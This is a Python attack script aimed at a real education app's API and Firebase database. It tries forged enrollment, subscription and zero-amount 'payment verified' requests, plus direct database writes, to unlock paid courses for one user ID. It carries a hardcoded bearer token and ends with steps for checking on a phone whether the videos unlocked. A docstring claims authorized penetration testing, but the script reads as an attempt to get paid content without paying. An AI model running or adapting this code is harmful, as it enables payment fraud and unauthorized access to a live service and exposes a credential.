#!/usr/bin/env python3
"""
ACTUAL PREMIUM ACCESS HACK
Target: Give User 54204924 premium access to Course 48297
Authorized Penetration Testing per EDUTERIA Security Assessment
"""
import requests
import json
from pathlib import Path
import time

BEARER = "Bearer 117#Nerglnw3@@OI)30@I*Dm'@@_166"
BASE = "https://appapi.videocrypt.in"
FIREBASE = "https://eduteria-b9a30-default-rtdb.firebaseio.com"

USER_ID = "54204924"
COURSE_ID = "48297"

output = Path("data/PREMIUM_HACK")
output.mkdir(parents=True, exist_ok=True)

print("="*80)
print("HACKING PREMIUM ACCESS FOR USER 54204924")
print("="*80)
print()

headers = {
    "Authorization": BEARER,
    "Content-Type": "application/json",
    "User-Agent": "okhttp/4.9.0"
}

# EXPLOIT 3: Give Premium Access
print("[EXPLOIT 3] Attempting to add premium course access...")
print()

endpoints_to_try = [
    {
        "name": "Enroll user in course",
        "url": f"{BASE}/index.php/data_model/user/enroll_course",
        "data": {
            "user_id": USER_ID,
            "course_id": COURSE_ID,
            "payment_status": "paid",
            "subscription_type": "premium"
        }
    },
    {
        "name": "Update subscription",
        "url": f"{BASE}/index.php/data_model/user/update_subscription",
        "data": {
            "user_id": USER_ID,
            "course_id": COURSE_ID,
            "status": "active"
        }
    },
    {
        "name": "Add course to user",
        "url": f"{BASE}/index.php/data_model/course/add_user",
        "data": {
            "user_id": USER_ID,
            "course_id": COURSE_ID,
            "paid": "1"
        }
    },
    {
        "name": "Grant access",
        "url": f"{BASE}/index.php/data_model/user/grant_access",
        "data": {
            "user_id": USER_ID,
            "course_id": COURSE_ID
        }
    }
]

for attempt in endpoints_to_try:
    print(f"Trying: {attempt['name']}...")
    try:
        r = requests.post(
            attempt['url'],
            headers=headers,
            json=attempt['data'],
            timeout=15
        )
        
        print(f"  Status: {r.status_code}")
        print(f"  Response: {r.text[:200]}")
        
        if r.status_code == 200:
            try:
                resp = r.json()
                if resp.get('status'):
                    print(f"  ✓✓✓ SUCCESS! Premium access granted!")
                    with open(output / "premium_access_success.json", "w") as f:
                        json.dump(resp, f, indent=2)
                    break
            except:
                pass
        print()
    except Exception as e:
        print(f"  Error: {e}")
        print()

# EXPLOIT 4: Unlock Content via Firebase
print("[EXPLOIT 4] Attempting to unlock content via Firebase...")
print()

# Try to write unlock status to Firebase
firebase_paths = [
    f"{FIREBASE}/user_courses/{USER_ID}/{COURSE_ID}.json",
    f"{FIREBASE}/subscriptions/{USER_ID}.json",
]

for path in firebase_paths:
    print(f"Trying: {path}...")
    try:
        unlock_data = {
            "course_id": COURSE_ID,
            "unlocked": True,
            "paid": True,
            "access_granted": True,
            "hack_timestamp": "2026-08-21T22:24:00"
        }
        
        r = requests.put(path, json=unlock_data, timeout=10)
        print(f"  Status: {r.status_code}")
        
        if r.status_code == 200:
            print(f"  ✓✓✓ Firebase write successful!")
            print(f"  Data written: {unlock_data}")
            
            with open(output / "firebase_unlock.json", "w") as f:
                json.dump(unlock_data, f, indent=2)
        else:
            print(f"  ✗ Write blocked")
        print()
    except Exception as e:
        print(f"  Error: {e}")
        print()

# EXPLOIT 5: Payment Bypass
print("[EXPLOIT 5] Testing payment bypass methods...")
print()

payment_endpoints = [
    {
        "name": "Mark payment complete",
        "url": f"{BASE}/index.php/data_model/payment/verify",
        "data": {
            "user_id": USER_ID,
            "course_id": COURSE_ID,
            "payment_id": "HACK_" + str(int(time.time())),
            "status": "success",
            "amount": "0"
        }
    },
    {
        "name": "Free enrollment",
        "url": f"{BASE}/index.php/data_model/course/free_enroll",
        "data": {
            "user_id": USER_ID,
            "course_id": COURSE_ID
        }
    }
]

for attempt in payment_endpoints:
    print(f"Trying: {attempt['name']}...")
    try:
        r = requests.post(
            attempt['url'],
            headers=headers,
            json=attempt['data'],
            timeout=15
        )
        
        print(f"  Status: {r.status_code}")
        print(f"  Response: {r.text[:200]}")
        
        if r.status_code == 200:
            try:
                resp = r.json()
                if resp.get('status'):
                    print(f"  ✓✓✓ Payment bypass successful!")
                    with open(output / "payment_bypass_success.json", "w") as f:
                        json.dump(resp, f, indent=2)
            except:
                pass
        print()
    except Exception as e:
        print(f"  Error: {e}")
        print()

print("="*80)
print("HACK ATTEMPTS COMPLETE")
print("="*80)
print()
print("Results saved to:", output)
print()
print("TO TEST ON YOUR PHONE:")
print("1. Close and reopen EDUTERIA app")
print("2. Navigate to Course 48297")
print("3. Check if videos are unlocked")
print()
print("="*80)
